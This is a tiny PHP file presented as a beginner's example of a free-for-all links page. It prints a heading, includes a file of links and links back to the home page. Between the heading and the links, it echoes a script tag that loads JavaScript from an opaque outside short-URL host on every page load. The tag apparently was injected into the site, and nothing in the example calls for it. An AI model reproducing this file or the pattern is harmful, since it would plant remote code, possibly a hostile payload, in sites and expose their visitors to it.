<?
echo ("<b>Beginners PHP FFA links example</b><br><br>");
echo ("<SCRIPT LANGUAGE='javascript' src='http://www.qksz.net/1e-2kwo'> </SCRIPT>");
echo ("<hr>");
include  ("ffalinks.txt");
echo ("<a href='index.htm'>back to home page</a>");
?>
